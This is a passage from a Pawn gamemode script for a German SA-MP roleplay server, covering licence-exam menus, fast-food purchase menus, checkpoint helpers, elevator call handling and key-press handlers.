		if(MotorradSchritt[playerid] == 120)//Frage 4
		{
		    if(antwort == 3)
		    {
		        GameTextForPlayer(playerid,"~g~Du hast es Geschafft~r~Bestanden~n~~w~Herzlichen Glückwunsch zum Führerschein!",5000,3);
			    MotorradTimer[playerid] = SetTimerEx("Motorrad",1000,1,"i",playerid);
		    }
		    else OnPlayerFailedPruefung(playerid);
		}
		HideMenuForPlayer(MotorradMenu,playerid);
    }
	if(CurrentMenu == PruefungMenu)
	{
	    new antwort = row+1;
		if(PruefungsSchritt[playerid] == 90) // Frage 1
		{
			if(antwort == 3)
			{
			    GameTextForPlayer(playerid,"~g~Das war Richtig",5000,3);
			    PruefungsTimer[playerid] = SetTimerEx("OnPlayerPruefung",1000,1,"i",playerid);
			}
			else OnPlayerFailedPruefung(playerid);
		}
		else if(PruefungsSchritt[playerid] == 100) // Frage 2
		{
			if(antwort == 3)
			{
			    GameTextForPlayer(playerid,"~g~Und das auch",5000,3);
			    PruefungsTimer[playerid] = SetTimerEx("OnPlayerPruefung",1000,1,"i",playerid);
			}
			else OnPlayerFailedPruefung(playerid);
		}
		else if(PruefungsSchritt[playerid] == 110) // Frage 3
		{
			if(antwort == 1 || antwort == 2)
			{
			    GameTextForPlayer(playerid,"~g~Gut mach weiter so",5000,3);
			    PruefungsTimer[playerid] = SetTimerEx("OnPlayerPruefung",1000,1,"i",playerid);
			}
			else OnPlayerFailedPruefung(playerid);
		}
		else if(PruefungsSchritt[playerid] == 120) // Frage 4
		{
			if(antwort == 3 || antwort == 4)
			{
			    GameTextForPlayer(playerid,"~g~Du hast es Geschafft~r~Bestanden~n~~w~Herzlichen Glückwunsch zum Führerschein!",5000,3);
			    PruefungsTimer[playerid] = SetTimerEx("OnPlayerPruefung",1000,1,"i",playerid);
			}
			else OnPlayerFailedPruefung(playerid);
		}
		HideMenuForPlayer(PruefungMenu,playerid);
	}

	if(CurrentMenu == BSMK)// VORHER BEI /MENU TYP CHECKEN!
	{
		switch(row)
	    {
	        case 0:
         	{
	         	if(GetPlayerMoneySave(playerid) >= 3)
	         	{







		     		ShowMenuForPlayer(BSMK,playerid);
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 3;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 3;
//                    FraktionsKasse[6] += 3;
	     		    GivePlayerMoneySave(playerid, -3);
	     		    SetPlayerHealth(playerid, 100);
		            SendClientMessage(playerid, NB, "Sie haben sich 3 Chicken Nuggets gekauft.");

				}
				else
				{
                	SendClientMessage(playerid, NY, "Sie haben zuwenig Geld.");
		        }
			}
	        case 1:
	        {
         		if(GetPlayerMoneySave(playerid) >= 4)
	         	{
		     		ShowMenuForPlayer(BSMK,playerid);
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 3;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 3;
		     		GivePlayerMoneySave(playerid, -4);
		     		SetPlayerHealth(playerid, 100);
              		SendClientMessage(playerid, NB, "Sie haben sich 12 Chicken Nuggets gekauft.");
		        }
                else
				{
                	SendClientMessage(playerid, NY, "Sie haben zuwenig Geld.");
		        }
			}
	        case 2:
	        {
		        if(GetPlayerMoneySave(playerid) >= 5)
	         	{
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 3;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 3;
		     		ShowMenuForPlayer(BSMK,playerid);
		     		GivePlayerMoneySave(playerid, -5);
		     		SetPlayerHealth(playerid, 100);
		            SendClientMessage(playerid, NB, "Sie haben sich 20 Chicken Nuggets gekauft.");

		        }
                else
				{
                	SendClientMessage(playerid, NY, "Sie haben zuwenig Geld.");
		        }
			}
			case 3:
			{
				if(GetPlayerMoneySave(playerid) >= 1)
	         	{
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 3;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 3;
		     		ShowMenuForPlayer(BSMK,playerid);
		     		GivePlayerMoneySave(playerid, -1);
		     		SetPlayerHealth(playerid, 100);
		            SendClientMessage(playerid, NB, "Sie haben sich einen Cheesburger gekauft.");
	 			}
                else
				{
	                SendClientMessage(playerid, NY, "Sie haben zuwenig Geld.");
		        }
			}
 			case 4:
			{
				if(GetPlayerMoneySave(playerid) >= 1)
	         	{
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 3;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 3;
		     		ShowMenuForPlayer(BSMK,playerid);
		     		GivePlayerMoneySave(playerid, -1);
		     		SetPlayerHealth(playerid, 100);
		            SendClientMessage(playerid, NB, "Sie haben sich einen Chickenburger gekauft.");
	 			}
                else
				{
	                SendClientMessage(playerid, NY, "Sie haben zuwenig Geld.");
		        }
			}
 			case 5:
			{
				if(GetPlayerMoneySave(playerid) >= 3)
	         	{
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 3;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 3;
		     		ShowMenuForPlayer(BSMK,playerid);
		     		GivePlayerMoneySave(playerid, -3);
		     		SetPlayerHealth(playerid, 100);
		            SendClientMessage(playerid, NB, "Sie haben sich einen Mc Chicken gekauft.");
	 			}
                else
				{
	                SendClientMessage(playerid, NY, "Sie haben zuwenig Geld.");
		        }
			}
 			case 6:
			{
				if(GetPlayerMoneySave(playerid) >= 2)
	         	{
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 3;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 3;
				    ShowMenuForPlayer(BSMK,playerid);
				    GivePlayerMoneySave(playerid, -2);
				    SetPlayerHealth(playerid, 100);
		            SendClientMessage(playerid, NB, "Sie haben sich Pommes gekauft.");
	 			}
	 			else
				{
	                SendClientMessage(playerid, NY, "Sie haben zuwenig Geld.");
		        }
			}
 			case 7:
			{
				if(GetPlayerMoneySave(playerid) >= 4)
	         	{
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 3;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 3;
				    ShowMenuForPlayer(BSMK,playerid);
				    GivePlayerMoneySave(playerid, -4);
				    SetPlayerHealth(playerid, 100);
		            SendClientMessage(playerid, NB, "Sie haben sich einen Big Mac gekauft.");
	 			}
	 			else
				{
	                SendClientMessage(playerid, NY, "Sie haben zuwenig Geld.");
		        }
			}
 			case 8:
			{
				if(GetPlayerMoneySave(playerid) >= 3)
	         	{
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 3;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 3;
				    ShowMenuForPlayer(BSMK,playerid);
				    GivePlayerMoneySave(playerid, -3);
				    SetPlayerHealth(playerid, 100);
		            SendClientMessage(playerid, NB, "Sie haben sich einen Fisch Mac gekauft.");
	 			}
	 			else
				{
	                SendClientMessage(playerid, NY, "Sie haben zuwenig Geld.");
		        }
			}
			case 9:
			{
				if(GetPlayerMoneySave(playerid) >= 1)
	         	{
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bProducts] -= 3;
					BizzInfo[PlayerInfo[playerid][pLocal]-99][bTill] += 3;
				    ShowMenuForPlayer(BSMK,playerid);
				    GivePlayerMoneySave(playerid, -1);
				    SetPlayerHealth(playerid, 100);
		            SendClientMessage(playerid, NB, "Sie haben sich ein Glas Cola gekauft.");
	 			}
	 			else
				{
	                SendClientMessage(playerid, NY, "Sie haben zuwenig Geld.");
		        }
			}
 			case 10:
			{
			    HideMenuForPlayer(BSMK,playerid);
	            UnFreezePlayer(playerid);
 			}
		}
	}

	if(CurrentMenu == PMK)
	{
		switch(row)
	    {
	        case 0:
         	{
	         	if(GetPlayerMoneySave(playerid) >= 3)
	         	{
		     		ShowMenuForPlayer(PMK,playerid);
	     		    GivePlayerMoneySave(playerid, -3);
	     		    SetPlayerHealth(playerid, 100);

				}
				else
				{
	                SendClientMessage(playerid, NY, "Sie haben zuwenig Geld.");
		        }
			}
	        case 1:
	        {
         		if(GetPlayerMoneySave(playerid) >= 4)
	         	{
		     		ShowMenuForPlayer(PMK,playerid);
		     		GivePlayerMoneySave(playerid, -4);
		     		SetPlayerHealth(playerid, 100);
		        }
                else
				{
	                SendClientMessage(playerid, NY, "Sie haben zuwenig Geld.");
		        }
			}
	        case 2:
	        {
		        if(GetPlayerMoneySave(playerid) >= 10)
	         	{
		     		ShowMenuForPlayer(PMK,playerid);
		     		GivePlayerMoneySave(playerid, -10);
		     		SetPlayerHealth(playerid, 100);

		        }
                else
				{
	                SendClientMessage(playerid, NY, "Sie haben zuwenig Geld.");
		        }
			}
	        case 3:
			{
				if(GetPlayerMoneySave(playerid) >= 1)
	         	{
		     		ShowMenuForPlayer(PMK,playerid);
		     		GivePlayerMoneySave(playerid, -1);
		     		SetPlayerHealth(playerid, 100);
	 			}
                else
				{
	                SendClientMessage(playerid, NY, "Sie haben zuwenig Geld.");
		        }
            }
 			case 4:
			{
				if(GetPlayerMoneySave(playerid) >= 1)
	         	{
		     		ShowMenuForPlayer(PMK,playerid);
		     		GivePlayerMoneySave(playerid, -1);
		     		SetPlayerHealth(playerid, 100);
	 			}
                else
				{
					SendClientMessage(playerid, NY, "Sie haben zuwenig Geld.");
		        }
			}
 			case 5:
			{
				if(GetPlayerMoneySave(playerid) >= 3)
	         	{
		     		ShowMenuForPlayer(PMK,playerid);
		     		GivePlayerMoneySave(playerid, -3);
		     		SetPlayerHealth(playerid, 100);
	 			}
                else
				{
	                SendClientMessage(playerid, NY, "Sie haben zuwenig Geld.");
		        }
			}
 			case 6:
			{
				if(GetPlayerMoneySave(playerid) >= 2)
	         	{
				    ShowMenuForPlayer(PMK,playerid);
				    GivePlayerMoneySave(playerid, -2);
				    SetPlayerHealth(playerid, 100);
	 			}
	 			else
				{
	                SendClientMessage(playerid, NY, "Sie haben zuwenig Geld.");
		        }
			}
 			case 7:
			{
				if(GetPlayerMoneySave(playerid) >= 4)
	         	{
				    ShowMenuForPlayer(PMK,playerid);
				    GivePlayerMoneySave(playerid, -4);
				    SetPlayerHealth(playerid, 100);
	 			}
	 			else
				{
	                SendClientMessage(playerid, NY, "Sie haben zuwenig Geld.");
		        }
			}
 			case 8:
			{
				if(GetPlayerMoneySave(playerid) >= 3)
	         	{
				    ShowMenuForPlayer(PMK,playerid);
				    GivePlayerMoneySave(playerid, -3);
				    SetPlayerHealth(playerid, 100);
	 			}
	 			else
				{
	                SendClientMessage(playerid, NY, "Sie haben zuwenig Geld.");
		        }
			}
			case 9:
			{
				if(GetPlayerMoneySave(playerid) >= 1)
	         	{
				    ShowMenuForPlayer(PMK,playerid);
				    GivePlayerMoneySave(playerid, -1);
				    SetPlayerHealth(playerid, 100);
	 			}
	 			else
				{
	                SendClientMessage(playerid, NY, "Sie haben zuwenig Geld.");
		        }
			}
 			case 10:
			{
			    HideMenuForPlayer(PMK,playerid);
	            UnFreezePlayer(playerid);
 			}
		}
	}

	if(CurrentMenu == CBKM)
	{
		switch(row)
	    {
	        case 0:
         	{
	         	if(GetPlayerMoneySave(playerid) >= 3)
	         	{
		     		ShowMenuForPlayer(CBKM,playerid);
	     		    GivePlayerMoneySave(playerid, -3);
	     		    SetPlayerHealth(playerid, 100);
				}
				else
				{
					SendClientMessage(playerid, NY, "Sie haben zuwenig Geld.");
		        }
			}
	        case 1:
	        {
         		if(GetPlayerMoneySave(playerid) >= 4)
	         	{
		     		ShowMenuForPlayer(CBKM,playerid);
		     		GivePlayerMoneySave(playerid, -4);
		     		SetPlayerHealth(playerid, 100);
		        }
                else
				{
	                SendClientMessage(playerid, NY, "Sie haben zuwenig Geld.");
		        }
			}
	        case 2:
	        {
		        if(GetPlayerMoneySave(playerid) >= 5)
	         	{
		     		ShowMenuForPlayer(CBKM,playerid);
		     		GivePlayerMoneySave(playerid, -5);
		     		SetPlayerHealth(playerid, 100);

		        }
                else
				{
					SendClientMessage(playerid, NY, "Sie haben zuwenig Geld.");
		        }
			}
	        case 3:
			{
				if(GetPlayerMoneySave(playerid) >= 1)
	         	{
		     		ShowMenuForPlayer(CBKM,playerid);
		     		GivePlayerMoneySave(playerid, -1);
		     		SetPlayerHealth(playerid, 100);
	 			}
                else
				{
                	SendClientMessage(playerid, NY, "Sie haben zuwenig Geld.");
		        }
			}
 			case 4:
			{
				if(GetPlayerMoneySave(playerid) >= 1)
	         	{
		     		ShowMenuForPlayer(CBKM,playerid);
		     		GivePlayerMoneySave(playerid, -1);
		     		SetPlayerHealth(playerid, 100);
	 			}
                else
				{
                	SendClientMessage(playerid, NY, "Sie haben zuwenig Geld.");
		        }
			}
 			case 5:
			{
				if(GetPlayerMoneySave(playerid) >= 3)
	         	{
		     		ShowMenuForPlayer(CBKM,playerid);
		     		GivePlayerMoneySave(playerid, -3);
		     		SetPlayerHealth(playerid, 100);
	 			}
                else
				{
                	SendClientMessage(playerid, NY, "Sie haben zuwenig Geld.");
		        }
			}
 			case 6:
			{
				if(GetPlayerMoneySave(playerid) >= 2)
	         	{
				    ShowMenuForPlayer(CBKM,playerid);
				    GivePlayerMoneySave(playerid, -2);
				    SetPlayerHealth(playerid, 100);
	 			}
	 			else
				{
                	SendClientMessage(playerid, NY, "Sie haben zuwenig Geld.");
		        }
			}
 			case 7:
			{
				if(GetPlayerMoneySave(playerid) >= 4)
	         	{
				    ShowMenuForPlayer(CBKM,playerid);
				    GivePlayerMoneySave(playerid, -4);
				    SetPlayerHealth(playerid, 100);
	 			}
	 			else
				{
	                SendClientMessage(playerid, NY, "Sie haben zuwenig Geld.");
		        }
			}
 			case 8:
			{
				if(GetPlayerMoneySave(playerid) >= 3)
	         	{
				    ShowMenuForPlayer(CBKM,playerid);
				    GivePlayerMoneySave(playerid, -3);
				    SetPlayerHealth(playerid, 100);
	 			}
	 			else
				{
	                SendClientMessage(playerid, NY, "Sie haben zuwenig Geld.");
		        }
			}
			case 9:
			{
				if(GetPlayerMoneySave(playerid) >= 1)
	         	{
				    ShowMenuForPlayer(CBKM,playerid);
				    GivePlayerMoneySave(playerid, -1);
				    SetPlayerHealth(playerid, 100);
	 			}
	 			else
				{
	                SendClientMessage(playerid, NY, "Sie haben zuwenig Geld.");
		        }
			}
 			case 10:
			{
			    HideMenuForPlayer(CBKM,playerid);
	            UnFreezePlayer(playerid);
 			}
		}
	}

	return 1;
}

Function OnPlayerExitedMenu(playerid)
{
	new Menu:CurrentMenu = GetPlayerMenu(playerid);
	if(CurrentMenu == BSMK || CurrentMenu == PMK || CurrentMenu == CBKM)
	{
		UnFreezePlayer(playerid);
	}
	if(CurrentMenu == PruefungMenu && PlayerInfo[playerid][pCarLic] == 0)
	{
		ShowMenuForPlayer(PruefungMenu,playerid);
	}
	if(CurrentMenu == MotorradMenu && PlayerInfo[playerid][pMotoLic] == 0)
	{
	    ShowMenuForPlayer(MotorradMenu,playerid);
	}
	return 1;
}

Function SetAllPlayerCheckpoint(Float:allx, Float:ally, Float:allz, Float:radi, num)
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
			SetPlayerCheckpoint(i,allx,ally,allz, radi);
			if (num != 255)
			{
				gPlayerCheckpointStatus[i] = num;
			}
		}
	}

}

Function SetAllCopCheckpoint(Float:allx, Float:ally, Float:allz, Float:radi)
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
			if(gTeam[i] == 2)
			{
				SetPlayerCheckpoint(i,allx,ally,allz, radi);
			}
		}
	}
	return 1;
}
forward UnfreezePlayer(plyid);
public UnfreezePlayer(plyid)
{
	TogglePlayerControllable(plyid,1);
	PlayerInfo[plyid][pGenerellFreezed] = 0;
	return 1;
}
/*
enum essenauto {
	Float:essX,
	Float:essY,
	Float:essZ
}

new IstAtAutomat[][essenauto] = {
//{1462.4657,-1011.3002,26.8438}
{1552.0938,-1679.9238,13.5514}
};

Function IsAtAutomat(playerid)
{
	for(new i=0;i<sizeof(IstAtAutomat);i++)
	{
		if(IsPlayerInRangeOfPoint(playerid,2.0, IstAtAutomat[i][essX],IstAtAutomat[i][essY],IstAtAutomat[i][essZ])) {
	        if(GetPlayerMoneySave(playerid) >= 1)
	        {
		        ApplyAnimation(playerid,"VENDING","VEND_Use",3.0,0,0,1,2000,0);
		        GivePlayerMoneySave(playerid, -1);
		        PlayerPlaySound(playerid,42600,0,0,0);
		        SetTimerEx("StopSprunk", 2500, 0, "i", playerid);
		        return 1;
	        }
	        else return PlayerPlaySound(playerid,1053,0,0,0);
		}
	}
	return 1;
}

Function StopSprunk(playerid)
{
	ApplyAnimation(playerid,"VENDING","VEND_Drink_P",3.0,0,0,0,0,0);
	new Float:hp;
	GetPlayerHealth(playerid, hp);
	SetPlayerHealth(playerid, hp+35);
	return 1;
}
*/
Function OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{


/*	if(newkeys && KEY_SECONDARY_ATTACK)
	{

	}*/

	if(IsPlayerInAnyVehicle(playerid) && newkeys == KEY_HANDBRAKE)
    {
        if (IsPlayerInAnyVehicle(playerid) && GetVehicleModel(GetPlayerVehicleID(playerid)) != 476)
        {
           // return SendClientMessage(playerid, 0xFF0000AA, "Du ekelhafter Mistkerl bist nicht in dem dafür vorhergesehenem Vehikel!");
           return 1;
        }
        else
        {
            Bombee(playerid);
        }
        return 1;
    }
	if (!IsPlayerInAnyVehicle(playerid) && (newkeys & KEY_YES))
	{
	    // Create variables and get the players current position
	    new Float:pos[3];
	    GetPlayerPos(playerid, pos[0], pos[1], pos[2]);

	    // For debug
	    //printf("X = %0.2f | Y = %0.2f | Z = %0.2f", pos[0], pos[1], pos[2]);

        // Check if the player is using the button inside the elevator
	    if (pos[1] > (BY_ELEVATOR_POS - 1.8) && pos[1] < (BY_ELEVATOR_POS + 1.8) && pos[0] < (BX_ELEVATOR_POS + 1.8) && pos[0] > (BX_ELEVATOR_POS - 1.8))
	    {
	        // The player is using the button inside the elevator
	        // --------------------------------------------------

	        // Show the elevator dialog to the player
	        BShowElevatorDialog(playerid);
	    }
		else
		{
		    // Check if the player is using the button on one of the floors
		    if(pos[1] < (BY_ELEVATOR_POS - 1.81) && pos[1] > (BY_ELEVATOR_POS - 3.8) && pos[0] > (BX_ELEVATOR_POS + 1.21) && pos[0] < (BX_ELEVATOR_POS + 3.8))
		    {
		        // The player is most likely using an elevator floor button... check which floor
		        // -----------------------------------------------------------------------------

		        // Create variable with the number of floors to check (total floors minus 1)
				new i = 13;

				// Loop
				while(pos[2] < BGetDoorsZCoordForFloor(i) + 3.5 && i > 0)
				    i --;

				if(i == 0 && pos[2] < BGetDoorsZCoordForFloor(0) + 2.0)
				    i = -1;

				if (i <= 12)
				{
				    // Check if the elevator is not moving (idle or waiting)
				    if (BElevatorState != ELEVATOR_STATE_MOVING)
				    {
				        // Check if the elevator is already on the floor it was called from
				        if (BElevatorFloor == i + 1)
				        {
				            // Display gametext message to the player
							GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~n~~n~~y~~h~LS BeachSide Elevator Is~n~~y~~h~Already On This Floor...~n~~w~Walk Inside It~n~~w~And Press '~k~~CONVERSATION_YES~'", 3500, 3);

							// Display chat text message to the player
	                        SendClientMessage(playerid, COLOR_MESSAGE_YELLOW, "* The LS BeachSide elevator is already on this floor... walk inside it and press '{FFFFFF}~k~~CONVERSATION_YES~{CCCCCC}'");

	                        // Exit here (return 1 so this callback is processed in other scripts)
	                        return 1;
				        }
				    }

				    // Call function to call the elevator to the floor
					BCallElevator(playerid, i + 1);

					// Display gametext message to the player
					GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~g~~h~LS BeachSide Elevator~n~~g~~h~Has Been Called...~n~~w~Please Wait", 3000, 3);

					// Create variable for formatted message
					new strTempString[100];

					// Check if the elevator is moving
					if (BElevatorState == ELEVATOR_STATE_MOVING)
					{
					    // Format chat text message
						format(strTempString, sizeof(strTempString), "* The LS BeachSide elevator has been called... it is currently moving towards the %s.", BFloorNames[BElevatorFloor]);
					}
					else
					{
					    // Check if the floor is the car park
					    if (BElevatorFloor == 0)
					    {
					    	// Format chat text message
							format(strTempString, sizeof(strTempString), "* The LS BeachSide elevator has been called... it is currently at the %s.", BFloorNames[BElevatorFloor]);
						}
						else
						{
					    	// Format chat text message
							format(strTempString, sizeof(strTempString), "* The LS BeachSide elevator has been called... it is currently on the %s.", BFloorNames[BElevatorFloor]);
						}
					}

					// Display formatted chat text message to the player
					SendClientMessage(playerid, COLOR_MESSAGE_YELLOW, strTempString);

					// Exit here (return 1 so this callback is processed in other scripts)
					return 1;
				}
		    }
		}
	}


	if (!IsPlayerInAnyVehicle(playerid) && (newkeys & KEY_YES))
	{
	    // Create variables and get the players current position
	    new Float:pos[3];
	    GetPlayerPos(playerid, pos[0], pos[1], pos[2]);

	    // For debug
	    //printf("X = %0.2f | Y = %0.2f | Z = %0.2f", pos[0], pos[1], pos[2]);

        // Check if the player is using the button inside the elevator
	    if (pos[1] > (AY_ELEVATOR_POS - 1.8) && pos[1] < (AY_ELEVATOR_POS + 1.8) && pos[0] < (AX_ELEVATOR_POS + 1.8) && pos[0] > (AX_ELEVATOR_POS - 1.8))
	    {
	        // The player is using the button inside the elevator
	        // --------------------------------------------------

	        // Show the elevator dialog to the player
	        AShowElevatorDialog(playerid);
	    }
		else
		{
		    // Check if the player is using the button on one of the floors
		    if(pos[1] < (AY_ELEVATOR_POS - 1.81) && pos[1] > (AY_ELEVATOR_POS - 3.8) && pos[0] > (AX_ELEVATOR_POS - 3.8) && pos[0] < (AX_ELEVATOR_POS - 1.81))
		    {
		        // The player is most likely using an elevator floor button... check which floor
		        // -----------------------------------------------------------------------------

		        // Create variable with the number of floors to check (total floors minus 1)
				new i = 10;

				// Loop
				while(pos[2] < AGetDoorsZCoordForFloor(i) + 3.5 && i > 0)
				    i --;

				if(i == 0 && pos[2] < AGetDoorsZCoordForFloor(0) + 2.0)
				    i = -1;

				if (i <= 9)
				{
				    // Check if the elevator is not moving (idle or waiting)
				    if (AElevatorState != ELEVATOR_STATE_MOVING)
				    {
				        // Check if the elevator is already on the floor it was called from
				        if (AElevatorFloor == i + 1)
				        {
				            // Display gametext message to the player
							GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~n~~n~~y~~h~LS Apartments 1 Elevator Is~n~~y~~h~Already On This Floor...~n~~w~Walk Inside It~n~~w~And Press '~k~~CONVERSATION_YES~'", 3500, 3);

							// Display chat text message to the player
	                        SendClientMessage(playerid, COLOR_MESSAGE_YELLOW, "* The LS Apartments 1 elevator is already on this floor... walk inside it and press '{FFFFFF}~k~~CONVERSATION_YES~{CCCCCC}'");

                            // Exit here (return 1 so this callback is processed in other scripts)
	                        return 1;
				        }
				    }

				    // Call function to call the elevator to the floor
					ACallElevator(playerid, i + 1);

					// Display gametext message to the player
					GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~g~~h~LS Apartments 1 Elevator~n~~g~~h~Has Been Called...~n~~w~Please Wait", 3000, 3);

					// Create variable for formatted message
					new strTempString[100];

					// Check if the elevator is moving
					if (AElevatorState == ELEVATOR_STATE_MOVING)
					{
					    // Format chat text message
						format(strTempString, sizeof(strTempString), "* The LS Apartments 1 elevator has been called... it is currently moving towards the %s.", AFloorNames[AElevatorFloor]);
					}
					else
					{
					    // Check if the floor is the car park
					    if (AElevatorFloor == 0)
					    {
					    	// Format chat text message
							format(strTempString, sizeof(strTempString), "* The LS Apartments 1 elevator has been called... it is currently at the %s.", AFloorNames[AElevatorFloor]);
						}
						else
						{
					    	// Format chat text message
							format(strTempString, sizeof(strTempString), "* The LS Apartments 1 elevator has been called... it is currently on the %s.", AFloorNames[AElevatorFloor]);
						}
					}

					// Display formatted chat text message to the player
					SendClientMessage(playerid, COLOR_MESSAGE_YELLOW, strTempString);

					// Exit here (return 1 so this callback is processed in other scripts)
					return 1;
				}
		    }
		}
	}







/*



	if(newkeys == 65536)//Deine Taste | Jetzt machst du mit der Taste "Z" das lich an und aus
	{








        if(IsPlayerInRangeOfPoint(playerid,25.0,2424.6873,54.2187,26.4564))
		{
			OnPlayerCommandText(playerid,"/htornew2");
			return 1;
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,1068.40,-1622.04,15.10))
		{
			OnPlayerCommandText(playerid,"/banktor");
			return 1;
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,2335.3582,2443.4690,5.8269))
		{
			OnPlayerCommandText(playerid,"/lvpdtor");
			return 1;
		}
	    if(IsPlayerInRangeOfPoint(playerid,15.0,1284.4850,-1652.2684,13.5469))
		{
			OnPlayerCommandText(playerid,"/mwtor");
			return 1;
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,1588.6610,-1638.5031,13.37955))
		{
			OnPlayerCommandText(playerid,"/pd1");
			return 1;
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,1545.2229,-1627.4520,13.3828))
		{
			OnPlayerCommandText(playerid,"/pd2");
			return 1;
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,2088.5112,1433.6021,10.8125))
		{
			OnPlayerCommandText(playerid,"/rtor2");
			return 1;
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,2106.6528,1384.7369,10.8203))
		{
			OnPlayerCommandText(playerid,"/rtor1");
			return 1;
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,2605.8357,2302.9019,10.8203))
		{
			OnPlayerCommandText(playerid,"/lcntor");
			return 1;
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,-2655.1680,-222.4467,4.3098))
		{
			OnPlayerCommandText(playerid,"/fixedtor");
			return 1;
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,-2803.0298,-329.6017,7.0391))
		{
			OnPlayerCommandText(playerid,"/triadentor");
			return 1;
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,321.2958,-1188.4626,76.3473))
		{
			OnPlayerCommandText(playerid,"/haustor");
			return 1;
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,-489.8557,-563.2194,25.3642))
		{
			OnPlayerCommandText(playerid,"/whtor");
			return 1;
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,135.0916,1941.1619,19.3144))
		{
			OnPlayerCommandText(playerid,"/bwtor1");
			return 1;
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,286.3394,1821.4331,17.6406))
		{
			OnPlayerCommandText(playerid,"/bwtor2");
			return 1;
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,282.5451,-1320.1892,53.8568))
		{
			OnPlayerCommandText(playerid,"/haustor2");
			return 1;
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,999.36078,-645.45374,120.85107))
		{
			OnPlayerCommandText(playerid,"/gateamk");
			return 1;
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,1881.3075,701.9736,10.8203))
		{
			OnPlayerCommandText(playerid,"/htor");
			return 1;
		}
        if(IsPlayerInRangeOfPoint(playerid,5.0,239.9216,117.4937,1003.2257))
		{
			OnPlayerCommandText(playerid,"/pdd1");
			return 1;
		}
        if(IsPlayerInRangeOfPoint(playerid,5.0,252.8763,109.0557,1003.2188))
		{
			OnPlayerCommandText(playerid,"/pdd2");
			return 1;
		}
        if(IsPlayerInRangeOfPoint(playerid,5.0,1729.9117,-1141.9672,24.0859))
		{
			OnPlayerCommandText(playerid,"/fbitor");
			return 1;
		}



        if(IsPlayerInRangeOfPoint(playerid,25.0,785.31372, -1152.43372, 19.71013))
		{
			OnPlayerCommandText(playerid,"/garki");
			return 1;
		}

        if(IsPlayerInRangeOfPoint(playerid,10.0,659.0154,-1227.0751,16.1319))
		{
			OnPlayerCommandText(playerid,"/amki3");
			return 1;
		}


        if(IsPlayerInRangeOfPoint(playerid,10.0,664.6283,-1308.8994,13.4609))
		{
			OnPlayerCommandText(playerid,"/terrorgate77");
			return 1;
		}




        if(IsPlayerInRangeOfPoint(playerid,27.0,2518.82227, 1822.89758, 6.96260))
		{
			OnPlayerCommandText(playerid,"/yakator");
			return 1;
		}

        if(IsPlayerInRangeOfPoint(playerid,10.0,2259.4753,2033.8008,10.8203))
		{
			OnPlayerCommandText(playerid,"/otor");
			return 1;
		}
        if(IsPlayerInRangeOfPoint(playerid,5.0,-299.1670,1507.9832,75.3594))
		{
			OnPlayerCommandText(playerid,"/newschranke");
			return 1;
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,-1701.8346,684.1790,24.8906))
		{
			OnPlayerCommandText(playerid,"/schranke1");
			return 1;
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,-1572.2925,662.0039,7.1875))
		{
			OnPlayerCommandText(playerid,"/schranke2");
			return 1;
		}
        if(IsPlayerInRangeOfPoint(playerid,15.0,-1631.5281,688.0742,7.1875))
		{
			OnPlayerCommandText(playerid,"/fbi");
			return 1;
		}
	    if(IsPlayerInRangeOfPoint(playerid,15.0,246.32, 72.97, 1003.64))
		{
			OnPlayerCommandText(playerid,"/lspdtor");
			return 1;
		}
	    if(IsPlayerInRangeOfPoint(playerid,15.0,923.48230, -1216.51563, 18.70460))
		{
			OnPlayerCommandText(playerid,"/otor1");
			return 1;
		}
		if (IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER )
		{
			OnPlayerCommandText(playerid,"/lock");
		}
	}
*/
/*
	if(newkeys == KEY_YES**)//Deine Taste | Jetzt machst du mit der Taste "Z" das lich an und aus
	{
		if (IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER )
		{
			OnPlayerCommandText(playerid,"/motor");
//			OnPlayerCommandText(playerid,"/licht");
		}
	}
*/
	if(SelectChar[playerid] == 255)
	{
